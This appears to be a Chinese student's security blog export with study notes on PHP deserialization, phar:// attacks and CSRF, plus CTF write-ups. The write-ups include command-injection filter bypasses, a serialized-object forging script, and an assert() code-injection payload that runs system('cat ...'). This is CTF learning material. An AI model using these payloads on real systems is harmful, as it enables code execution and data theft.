<h4 id="linux中直接查看文件内容的工具"><a href="#linux中直接查看文件内容的工具" class="headerlink" title="linux中直接查看文件内容的工具"></a>linux中直接查看文件内容的工具</h4><p>cat、tac、more、less、head、tail、nl、sed、sort、uniq、</p>
<p>参考博客： <a class="link"   href="https://blog.csdn.net/silence1_/article/details/96135760" >https://blog.csdn.net/silence1_/article/details/96135760<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>序列化指的是 类的对象在传输的时候会变成字符串</p>
<p>而反序列化就是指 字符串可以变成一个对象。</p>
<h3 id="01、序列化和反序列化概述"><a href="#01、序列化和反序列化概述" class="headerlink" title="01、序列化和反序列化概述"></a>01、序列化和反序列化概述</h3><p>​	序列化：把对象转化为字符串</p>
<p>​	反序列化：字符串转化为对象 </p>
<p>​	通过反序列化在特定条件下可以重建php对象并执行php对象中某些magic函数</p>
<p>​	反序列化的作用在于有一些非常好的魔法函数。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314152006506.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="概述"
                ></p>
<p>​	在反序列化的时候，我们测试知道</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s1</span>=<span class="number">111</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$s2</span>=<span class="string">&#x27;protected&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$s3</span> =<span class="string">&#x27;private&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​		他被序列化之后  </p>
<p>​	<img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314233424586.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="over"
                ></p>
<p>魔法函数概述</p>
<p> Php对象中有一些特殊的函数，叫做magic函数，他们在特定条件下执行，比如创建、销毁对象的时候</p>
<p>  为了更好的理解magic方法是如何工作的，让我们添加一个magic方法在我们的类中。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314152043548.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="魔法函数"
                ></p>
<p>protected:  \0<em>\0name   %00</em>%00name</p>
<p>privated: \0类名\0name    %00类名%00name</p>
<p>当遇到过滤<code>%00</code>的时候，可以把s变成S 同时把value的%00变为%5c00。</p>
<p>在我们属性序列化字符串的时候，对类中不同的属性有不同的表述方式，protected ,private ，public 在序列化的时候都不是一样的 【注意 空格的时候可以用<code>%00</code>来代替。</p>
<h4 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h4><p>还有一个需要提到的点，就是在序列化字符串中，s - non-escaped binary string和 S - escaped binary string是有区别的。对于s就不用说了，这里说一下S属性： S:<length>:”<value>“ 其中 <length> 是源字符串的长度，而非 <value> 的长度。<length> 是非负整数，数字前可以带有正号（+）。<value> 为经过转义之后的字符串。它的转义规则是，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 <value> 的内容了。</p>
<p>  也就是说，对于刚才的序列化字符串：</p>
<p>  O:4:”Test”:3:{s:2:”s1”;i:111;s:5:”%00*%00s2”;s:9:”protected”;s:8:”%00Test%00s3”;s:7:”private”;}</p>
<p>  可以用S去代替s，即：</p>
<p>  O:4:”Test”:3:{S:2:”s1”;i:111;S:5:”%00*%00s2”;S:9:”protected”;S:8:”%00Test%00s3”;S:7:”private”;}</p>
<p>  但是对于 \00 这种转义了的，只有S才会认，而s并不会正常识别，详细区别见test1.php：</p>
<p>  <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/2940a329-e20c-4e90-8c2b-10bf72bf4180.png"
                      alt="img"
                ></p>
<p>  访问：<a class="link"   href="http://127.0.0.1/heetian/test1.php" >http://127.0.0.1/heetian/test1.php<i class="fas fa-external-link-alt"></i></a></p>
<p>  <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=GB9d6c0ca797abec2017041708484900001/ef87a1fe-2248-4915-9722-bd9067f6c6d5.png"
                      alt="img"
                ></p>
<p>  可以看到，这个结果和我们预期的一样。</p>
<hr>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314152306722.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="常见的函数"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314152353120.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="特别的string"
                ></p>
<p>我们在平常是如何使用反序列化呢？</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314152119696.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="产生方法"
                ></p>
<p>下面是一个简单的例子：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314152433588.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="例子"
                ></p>
<hr>
<h3 id="反序列化进阶"><a href="#反序列化进阶" class="headerlink" title="反序列化进阶"></a>反序列化进阶</h3><p>CTF中的一些小Tips :</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314172941548.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="tips_1"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314173023291.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="tips_2"
                ></p>
<p>像上述的都是直接利用反序列化函数做的</p>
<p>如果没有反序列化函数的话，我们可以利用到phar:&#x2F;&#x2F;流扩展反序列化的方式攻击</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314173219296.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="概述"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314173356706.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="概述"
                ></p>
<p>下面是收到该函数就会产生反序列化效果的函数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314173252404.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="函数表"
                ></p>
<p>这里就要提问了！！</p>
<p>怎么生成这个文件呢？？</p>
<p>下面是一个例子</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314173445262.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="生成方法"
                ></p>
<p>其中的phar文件有：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314173543720.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="文件类别"
                ></p>
<p>下面是利用phar文件的方法 ：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200314173628290.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="利用方法"
                ></p>
<p>好了好了，感觉这篇笔记怎么全是图片</p>
<p>emm总结下phar文件打反序列化的过程</p>
<p>1、我们查看类，找到利用点</p>
<p>2、根据利用点 写phar文件 </p>
<p>3、把char文件上传 再利用phar:&#x2F;&#x2F;协议来打反序列化</p>
<p>下面给个例子</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/2020031417371079.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="题目"
                ></p>
<p>下面是patload：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/2020031417372070.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="解题"
                ></p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="csrf概述"><a href="#csrf概述" class="headerlink" title="csrf概述"></a>csrf概述</h3><p>跨站请求伪造</p>
<p>1、跨站点的请求</p>
<p>2、请求时伪造的</p>
<p>它是一种挟制用户在当前已登陆的web应用程序上执行非本意的操作的攻击方法</p>
<p>CSRF漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那么以后只要是访问这个网站，都是默认你已经登陆的状态</p>
<p>次完整的CSRF攻击，需要受害用户需要完成两个步骤：</p>
<p>​    1.登录正常网站，并在本地生成Cookie。</p>
<p>​    2.在不退出正常网站的情况下，访问恶意网站。</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/05096033-30ec-4142-9d6a-aa67c95e896e.png"
                      alt="img"
                ></p>
<p>csrf的本质就是在不知情的情况下执行请求</p>
<p>分为get类型csrf  post型csrf</p>
<p>重点在于利用html构造请求</p>
<h3 id="csrf漏洞利用"><a href="#csrf漏洞利用" class="headerlink" title="csrf漏洞利用"></a>csrf漏洞利用</h3><p>csrf分为两类 </p>
<p>1、操作类型csrf：模拟人为操作，让受害者执行危险请求</p>
<p>2读取类型csrf：模拟人为请求，获取受害者敏感信息</p>
<p>它可以分为 cars，jsonp。【我看视频看不下去了。他讲的我听不懂。</p>
<p>合天的总结：</p>
<p>看这个好多天了。</p>
<p>但是我真的觉得好恶心。。。 特别是CSRF SSRF这两个 我看的贼懵逼</p>
<p>合天剩下的有逻辑漏洞 ，文件上传，文件包含，sql注入。</p>
<p>后面三个以前就学过，所以我不是很打算再去看。不过我的计划是</p>
<p>一周看一个 ，其余时间全刷题目！！</p>
<p>总结以下；这次合天的培训 我学到了挺多的。就我而言。。</p>
<p>那么我想的是今天18号。在30号之前，我要刷完攻防世界的web，同时刷两套真题！</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
  </entry>
  <entry>
    <title>Every CTFproblem</title>
    <url>/2020/03/16/CTFcomig/Every-CTFproblem/</url>
    <content><![CDATA[<h2 id="2020-03-16"><a href="#2020-03-16" class="headerlink" title="2020.03.16"></a>2020.03.16</h2><p>今日份是我差不多开始了新的开始 ，前面几天都是一些合天的学习，算法的训练</p>
<p>以下是今日题目 仅一题表示开始</p>
<h3 id="攻防世界-upload1"><a href="#攻防世界-upload1" class="headerlink" title="攻防世界-upload1"></a>攻防世界-upload1</h3><p>首先这道题的上传仅仅过滤了前端 而且是不符合规则把submit按钮给display了</p>
<p>手动把display去掉就行了。</p>
<p>之后文件上传的过程中 我发现我出现了问题，我的菜刀连不上去 蚁剑也是。试了试文件上传之后可以访问成功。那么可以构建命令执行</p>
<span id="more"></span>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200316231955917.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="命令执行"
                ></p>
<p>我是先试着<code> ls   cd ../;ls   cd ../;cat flag.php</code></p>
<p>这样一步步来就好了 </p>
<p>这道题目的感受是：在文件上传成功之后，先尝试可否访问，我觉得可以在php文件中加一些标记 这样可能会更好</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200316232326666.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="http"
                ></p>
<p>这样之后尝试访问，可以发现</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200316232304394.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="23333"
                ></p>
<p>很明显 菜刀连不上可能是我出了问题。但是出现问题又怎么样呢？总不能放弃吧。换条路 ，RCE尝试一波。</p>
<p>今天就先这样吧 明天周二好苦，还有计组 笔记也还没写。哭泣了</p>
<h2 id="2020-03-18"><a href="#2020-03-18" class="headerlink" title="2020.03.18"></a>2020.03.18</h2><p>今日的题目很有意思</p>
<h3 id="命令注入综合"><a href="#命令注入综合" class="headerlink" title="命令注入综合"></a>命令注入综合</h3><p>下面是知识点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls 目录名   可以直接输出此目录下的文件</span><br><span class="line">过滤了 ; |  &amp;		可以用%<span class="number">0</span>a、%<span class="number">0</span>d、%<span class="number">0</span>D%<span class="number">0</span>A 绕过 不过有趣的是要在URL上改 不然可能会出现编码%<span class="number">25</span>a %<span class="number">25</span>d之类的</span><br><span class="line">过滤了|cat|flag|ctfhub  这些关键字该怎么过滤呢？ fla<span class="string">&#x27;&#x27;</span>g   fl$*ag fl\)ag  之类的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目过一遍吧</p>
<p>首先查看过滤了什么  一开始我没注意到过滤了空格</p>
<p>我建议payload测试顺序应该为：</p>
<p><code>127.0.0.1</code></p>
<p><code>127.0.0.1(空格) </code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200318205407269.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="127.0.0.1"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200318205353930.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="127.0.0.1 "
                ></p>
<p>知道空格被过滤了</p>
<p>好的 运算符怎么过滤呢？  常见的%0a %0d  我一开始在输入框中测试发现都不成功，但是绕过就这几种啊。。 那么可能是被编码了导致的 直接在URL上处理！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200318205550785.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>那么怎么过滤关键字呢？ 上面提到<code>``</code>来过滤呗</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200318205659380.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="end"
                ></p>
<p>成功解决！  关键在于绕过测试手法的了解！</p>
<h2 id="2020-03-19"><a href="#2020-03-19" class="headerlink" title="2020.03.19"></a>2020.03.19</h2><p>今天的题目 反序列化</p>
<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>首先 这道题目的知识点我在合天都看过，我也知道怎么绕过。</p>
<p>但是就是也不出来！？为什么呢？ 是因为</p>
<p>这个类的成员变量是<code>private</code>类型 ，一般序列化后会变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private属性 ： 数据类型:属性名长度:&amp;quot;\00类名\00属性名&amp;quot;;数据类型:属性值长度:&amp;quot;属性值&amp;quot;;</span><br><span class="line"></span><br><span class="line">Protected属性 ： 数据类型:属性名长度:&amp;quot;\00*\00属性名&amp;quot;;数据类型:属性值长度:&amp;quot;属性值&amp;quot;;</span><br><span class="line"></span><br><span class="line">Public属性 ： 数据类型:属性名长度:&amp;quot;属性名&amp;quot;;数据类型:属性值长度:&amp;quot;属性值&amp;quot;;</span><br></pre></td></tr></table></figure>

<p>而我用脚本写序列化后再去改动再去base64加密，破坏了\00这个字符！</p>
<p>所以最好用脚本来加解密 增删改！ 而不是通过工具来修改！</p>
<p>下面是解题思路：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200319171014597.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="index.php"
                ></p>
<p>很明显 两处过滤</p>
<p>emm这两处过滤在合天那篇博客都写过怎么做</p>
<p>下面写下这个payload吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$objj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">//echo $objj;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$objj</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;1:&#123;s:&#x27;</span>,<span class="string">&#x27;2:&#123;s:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//echo $c;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>就可以啦！ 这道题很经典吧可以说。我觉得最重要的是要去用脚本去输出。不然会破坏\00.</p>
<p>大师傅的题解：<a class="link"   href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" >https://www.cnblogs.com/Mrsm1th/p/6835592.html<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>一进来看题；</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200319173528133.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>很明显嘛，逆向加密算法 </p>
<p>说一下几个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strrev</span>(str);    把字符串倒置</span><br><span class="line"><span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="variable">$start</span>,<span class="variable">$lenght</span>);    从str中第start个字符开始截取长度为length的字符串</span><br><span class="line"><span class="title function_ invoke__">str_rot13</span>(<span class="variable">$str</span>);  </span><br><span class="line"><span class="title function_ invoke__">str_rot13</span>() 函数对字符串执行 ROT13 编码。</span><br><span class="line"><span class="comment">//ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。</span></span><br><span class="line"><span class="comment">//提示：编码和解码都是由相同的函数完成的。如果您把已编码的字符串作为参数，那么将返回原始字符串。</span></span><br></pre></td></tr></table></figure>

<p>那么我们理一遍加密思路</p>
<p>1、倒置flag</p>
<p>2、把每一个字符的ascaii码加1</p>
<p>3、base64加密  倒置  ROT13编码</p>
<p>那么我们解密也有了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$flag</span>);  <span class="comment">//解码rot13</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$flag</span>);		<span class="comment">//倒置</span></span><br><span class="line"><span class="variable">$_o</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$flag</span>);<span class="comment">//base64解密</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;   <span class="comment">//把每个字符倒退</span></span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)-<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_</span>);					<span class="comment">//倒置</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>这道题目我做了百分之40吧。。。</p>
<p>首先 Git泄露我找出来了。但是之后代码审计的时候出现了错误！</p>
<p>先走走看吧。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200319200847968.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>明显的git先测试看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200319201048353.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>然后查看源码呗，我几乎看了所有文件 最后发现 利用点是在<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//page 一定要有</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">//增加字符串！</span></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里就是重点了</p>
<p>我直接输入&#x2F;?page&#x3D;flag</p>
<p>结果啥也没有  但是返回的是200  这说明可能注释掉了 我看不到而已</p>
<p>那么想想读取源码呗！ 就想到文件包含 结果 这个字符串被限制了。。。</p>
<p>尤其是尾部！ 尾部被限制了 搞不了搞不了</p>
<p>这是 注意到一个函数<code>assert($str)</code>这里存在命令执行漏洞！！</p>
<p>好的我们学习下这个命令执行漏洞的基本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">//这个是把$str这个字符串当作php代码执行   那么</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>)</span><br><span class="line"><span class="comment">//这里是不是就可以命令注入了？！！</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;字符串嘛！&quot;</span>)</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;_file_exists(&#x27;abs&#x27;) or system(&quot;</span>ls<span class="string">&quot;);//&#x27;)__&quot;</span>)</span><br><span class="line"><span class="comment">//里面的_是表示这之间是字符串！   那么被当作代码的是什么呢？</span></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;abs&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//__&#x27;)</span></span><br><span class="line"><span class="comment">//再看看！ 代码是不是被注入了！！！</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很好！ 那么答案就出来了！！！</p>
<p>payload: &#x2F;?page&#x3D;abs’) or system(“cat templates&#x2F;flag.php”);&#x2F;&#x2F;</p>
<p><img  
                     lazyload
                     alt="image"
